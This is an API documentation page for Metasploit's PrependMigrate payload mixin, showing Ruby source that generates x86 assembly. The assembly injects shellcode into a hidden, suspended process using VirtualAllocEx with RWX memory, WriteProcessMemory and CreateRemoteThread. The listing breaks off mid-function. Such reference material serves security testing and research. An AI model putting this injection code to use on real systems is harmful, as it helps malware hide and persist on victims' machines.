<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
  Module: Msf::Payload::Windows::PrependMigrate
  
    &mdash; Documentation by YARD 0.9.37
  
</title>

  <link rel="stylesheet" href="../../../css/style.css" type="text/css" />

  <link rel="stylesheet" href="../../../css/common.css" type="text/css" />

<script type="text/javascript">
  pathId = "Msf::Payload::Windows::PrependMigrate";
  relpath = '../../../';
</script>


  <script type="text/javascript" charset="utf-8" src="../../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../../js/app.js"></script>


  </head>
  <body>
    <div class="nav_wrap">
      <iframe id="nav" src="../../../class_list.html?1"></iframe>
      <div id="resizer"></div>
    </div>

    <div id="main" tabindex="-1">
      <div id="header">
        <div id="menu">
  
    <a href="../../../_index.html">Index (P)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span>
     &raquo; 
    <span class="title">PrependMigrate</span>
  
</div>

        <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../../class_list.html">

        <svg width="24" height="24">
          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
        </svg>
    </a>
  
</div>
        <div class="clear"></div>
      </div>

      <div id="content"><h1>Module: Msf::Payload::Windows::PrependMigrate
  
  
  
</h1>
<div class="box_info">
  

  
  
  
  
  

  
  <dl>
    <dt>Included in:</dt>
    <dd><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Msf::Payload::Windows</a></span></dd>
  </dl>
  

  
  <dl>
    <dt>Defined in:</dt>
    <dd>lib/msf/core/payload/windows/prepend_migrate.rb</dd>
  </dl>
  
</div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>This mixin provides support for generating PrependMigrate blocks for Windows payloads</p>


  </div>
</div>
<div class="tags">
  

</div>






  
    <h2>
      Instance Method Summary
      <small><a href="#" class="summary_toggle">collapse</a></small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#apply_prepend_migrate-instance_method" title="#apply_prepend_migrate (instance method)">#<strong>apply_prepend_migrate</strong>(buf)  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Overload the generate() call to prefix our stubs.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Initialize.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#prepend_migrate-instance_method" title="#prepend_migrate (instance method)">#<strong>prepend_migrate</strong>(buf)  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Create assembly.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#prepend_migrate%3F-instance_method" title="#prepend_migrate? (instance method)">#<strong>prepend_migrate?</strong>  &#x21d2; Boolean </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Returns the state of the PrependMigrate option See <a href="https://github.com/rapid7/metasploit-framework/pull/917">github.com/rapid7/metasploit-framework/pull/917</a> for discussion.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#prepend_migrate_64-instance_method" title="#prepend_migrate_64 (instance method)">#<strong>prepend_migrate_64</strong>(buf)  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
    </ul>
  



  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="apply_prepend_migrate-instance_method">
  
    #<strong>apply_prepend_migrate</strong>(buf)  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Overload the generate() call to prefix our stubs</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 36</span>

<span class='kw'>def</span> <span class='id identifier rubyid_apply_prepend_migrate'>apply_prepend_migrate</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_pre'>pre</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>

  <span class='id identifier rubyid_test_arch'>test_arch</span> <span class='op'>=</span> <span class='lbracket'>[</span> <span class='op'>*</span><span class='lparen'>(</span><span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span> <span class='rbracket'>]</span>

  <span class='kw'>if</span> <span class='id identifier rubyid_prepend_migrate?'>prepend_migrate?</span>
    <span class='comment'># Handle all x86 code here
</span>    <span class='kw'>if</span> <span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_X86</span><span class='rparen'>)</span>
      <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='id identifier rubyid_prepend_migrate'>prepend_migrate</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_migrate_asm'>migrate_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
    <span class='comment'># Handle all x64 code here
</span>    <span class='kw'>elsif</span> <span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_X64</span><span class='rparen'>)</span>
      <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='id identifier rubyid_prepend_migrate_64'>prepend_migrate_64</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_migrate_asm'>migrate_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
    <span class='kw'>end</span>
  <span class='kw'>end</span>
  <span class='kw'>return</span> <span class='id identifier rubyid_pre'>pre</span> <span class='op'>+</span> <span class='id identifier rubyid_buf'>buf</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="initialize-instance_method">
  
    #<strong>initialize</strong>(info = {})  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Initialize</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


13
14
15
16
17
18
19
20
21
22</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 13</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_ret'>ret</span> <span class='op'>=</span> <span class='kw'>super</span><span class='lparen'>(</span> <span class='id identifier rubyid_info'>info</span> <span class='rparen'>)</span>

  <span class='id identifier rubyid_register_advanced_options'>register_advanced_options</span><span class='lparen'>(</span>
    <span class='lbracket'>[</span>
      <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../OptBool.html" title="Msf::OptBool (class)">OptBool</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptBool.html#initialize-instance_method" title="Msf::OptBool#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrate</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>true</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Spawns and runs shellcode in new process</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='kw'>false</span> <span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../OptString.html" title="Msf::OptString (class)">OptString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'><span class='object_link'><a href="../../OptString.html#initialize-instance_method" title="Msf::OptString#initialize (method)">new</a></span></span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrateProc</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Process to spawn and run shellcode in</span><span class='tstring_end'>&quot;</span></span> <span class='rbracket'>]</span><span class='rparen'>)</span>
    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span> <span class='rparen'>)</span>
  <span class='id identifier rubyid_ret'>ret</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="prepend_migrate-instance_method">
  
    #<strong>prepend_migrate</strong>(buf)  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Create assembly</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 58</span>

<span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate'>prepend_migrate</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_payloadsize'>payloadsize</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
  <span class='id identifier rubyid_procname'>procname</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependMigrateProc</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rundll32</span><span class='tstring_end'>&#39;</span></span>

  <span class='comment'># Prepare instructions to get address of block_api into ebp
</span>  <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    call start
</span><span class='heredoc_end'>  EOS
</span>  <span class='id identifier rubyid_block_api_obj'>block_api_obj</span> <span class='op'>=</span> <span class='const'>Object</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='period'>.</span><span class='id identifier rubyid_extend'>extend</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../../../Msf.html" title="Msf (module)">Msf</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../../Payload.html" title="Msf::Payload (class)">Payload</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="../Windows.html" title="Msf::Payload::Windows (module)">Windows</a></span></span><span class='op'>::</span><span class='const'><span class='object_link'><a href="BlockApi.html" title="Msf::Payload::Windows::BlockApi (module)">BlockApi</a></span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='id identifier rubyid_block_api_obj'>block_api_obj</span><span class='period'>.</span><span class='id identifier rubyid_asm_block_api'>asm_block_api</span>

  <span class='comment'># Prepare default exit block (sleep for a long long time)
</span>  <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
    ;sleep
    push -1
    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Sleep</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>           ; hash( &quot;kernel32.dll&quot;, &quot;Sleep&quot; )
    call ebp                  ; Sleep( ... );
  </span><span class='tstring_end'>^</span></span>
  
  <span class='comment'># Check to see if we can find exitfunc in the payload
</span>  <span class='id identifier rubyid_exitfunc_block_asm'>exitfunc_block_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
  exitfunk:
    mov ebx, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>ExitThread</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>    ; The EXITFUNK as specified by user... kernel32.dll!ExitThread
    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GetVersion</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>        ; hash( &quot;kernel32.dll&quot;, &quot;GetVersion&quot; )
    call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
    cmp al, 6         ; If we are not running on Windows Vista, 2008 or 7
    jl goodbye       ; Then just call the exit function...
    cmp bl, 0xE0            ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
    jne goodbye      ;
    mov ebx, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>ntdll.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>RtlExitUserThread</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThreadgoodbye:                 ; We now perform the actual call to the exit function
  goodbye:  
    push 0x0            ; push the exit function parameter
    push ebx               ; push the hash of the exit function
    call ebp               ; call EXITFUNK( 0 );
  </span><span class='tstring_end'>^</span></span>
  <span class='id identifier rubyid_exitfunc_block_blob'>exitfunc_block_blob</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_exitfunc_block_asm'>exitfunc_block_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
  <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='id identifier rubyid_exitfunc_block_blob'>exitfunc_block_blob</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span>
    <span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x + payload - exitblock</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_exitfunc_index'>exitfunc_index</span> <span class='op'>-</span> <span class='int'>5</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_exitblock'>exitblock</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>exitblock:\njmp $+</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_exitblock_offset'>exitblock_offset</span><span class='embexpr_end'>}</span><span class='tstring_end'>&quot;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_block_api_ebp_asm'>block_api_ebp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    pop ebp                   ; Pop off the address of &#39;api_call&#39; for calling later.
</span><span class='heredoc_end'>  EOS
</span>  <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>

  <span class='comment'># Check if we can find block_api in the payload
</span>  <span class='id identifier rubyid_block_api'>block_api</span> <span class='op'>=</span> <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Ia32</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
  <span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>=</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_index'>index</span><span class='lparen'>(</span><span class='id identifier rubyid_block_api'>block_api</span><span class='rparen'>)</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_block_api_index'>block_api_index</span>

    <span class='comment'># Prepare instructions to calculate address
</span>    <span class='id identifier rubyid_ebp_offset'>ebp_offset</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lparen'>(</span><span class='id identifier rubyid_block_api_index'>block_api_index</span> <span class='op'>+</span> <span class='int'>5</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_block_api_ebp_asm'>block_api_ebp_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>      jmp close_to_payload
    return_from_close_to_payload:
      pop ebp
      add ebp, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_ebp_offset'>ebp_offset</span><span class='embexpr_end'>}</span><span class='tstring_content'>
</span><span class='heredoc_end'>    EOS
</span>    <span class='comment'># Clear now-unneeded instructions
</span>    <span class='id identifier rubyid_block_api_asm'>block_api_asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_block_api_start'>block_api_start</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
    <span class='id identifier rubyid_block_close_to_payload'>block_close_to_payload</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    close_to_payload:
      call return_from_close_to_payload
</span><span class='heredoc_end'>    EOS
</span>  <span class='kw'>end</span>

  <span class='comment'>#put all pieces together
</span>  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>=</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    cld                       ; Clear the direction flag.
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_start'>block_api_start</span><span class='embexpr_end'>}</span><span class='tstring_content'>
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_asm'>block_api_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
  start:
    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_block_api_ebp_asm'>block_api_ebp_asm</span><span class='embexpr_end'>}</span><span class='tstring_content'>
    ; get our own startupinfo at esp+0x60
    add esp,-400              ; adjust the stack to avoid corruption
    lea edx,[esp+0x60]
    push edx
    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>GetStartupInfoA</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>           ; hash( &quot;kernel32.dll&quot;, &quot;GetStartupInfoA&quot; )
    call ebp                  ; GetStartupInfoA( &amp;si );

    lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax

    jmp getcommand
    gotcommand:
    pop esi                   ; esi = address of process name (command line)

    ; create the process
    lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
    push edi                  ; lpProcessInformation : write processinfo here
    push eax                  ; lpStartupInfo : current info (read)
    xor ebx,ebx
    push ebx                  ; lpCurrentDirectory
    push ebx                  ; lpEnvironment
    push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
    push ebx                  ; bInHeritHandles
    push ebx                  ; lpThreadAttributes
    push ebx                  ; lpProcessAttributes
    push esi                  ; lpCommandLine
    push ebx                  ; lpApplicationName

    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>CreateProcessA</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>           ; hash( &quot;kernel32.dll&quot;, &quot;CreateProcessA&quot; )
    call ebp                  ; CreateProcessA( &amp;si );

    ; if we didn&#39;t get a new process, use this one
    test eax,eax
    jz payload                ; If process creation failed, jump to shellcode

  goodProcess:
    ; allocate memory in the process (VirtualAllocEx())
    ; get handle
    push 0x40                 ; RWX
    add bh, 0x10              ; ebx = 0x1000
    push ebx                  ; MEM_COMMIT
</span><span class='heredoc_end'>  EOS
</span>
  <span class='kw'>if</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span> <span class='op'>&gt;</span> <span class='int'>4096</span>
    <span class='comment'># probably stageless, so we don&#39;t have shellcode size constraints,
</span>    <span class='comment'># and so we can just set ebx to the size of the payload
</span>    <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    mov ebx, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; stageless size
</span><span class='heredoc_end'>    EOS
</span>  <span class='kw'>end</span>

  <span class='id identifier rubyid_migrate_asm'>migrate_asm</span> <span class='op'>&lt;&lt;</span> <span class='heredoc_beg'>&lt;&lt;-EOS</span>
<span class='tstring_content'>    push ebx                  ; size
    xor ebx,ebx
    push ebx                  ; address
    push [edi]                ; handle
    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>VirtualAllocEx</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; hash( &quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot; )
    call ebp                  ; VirtualAllocEx( ...);

    ; eax now contains the destination
    ; WriteProcessMemory()
    push esp                  ; lpNumberOfBytesWritten
    push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_payloadsize'>payloadsize</span><span class='embexpr_end'>}</span><span class='tstring_content'>       ; nSize
    ; pick up pointer to shellcode &amp; keep it on stack
    jmp begin_of_payload
    begin_of_payload_return:  ; lpBuffer
    push eax                  ; lpBaseAddress
    push [edi]                ; hProcess
    push </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&quot;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>WriteProcessMemory</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> ; hash( &quot;kernel32.dll&quot;, &quot;WriteProcessMemory&quot; )
    call ebp                  ; WriteProcessMemory( ...)

    ; run the code (CreateRemoteThread())
    push ebx                  ; lpthreadID
    push ebx                  ; run immediately
    push ebx                  ; no parameter
    mov ecx,[esp-0x4]
    push ecx                  ; shellcode
    push ebx                  ; stacksize
    push ebx                  ; lpThreadAttributes
    push [edi]
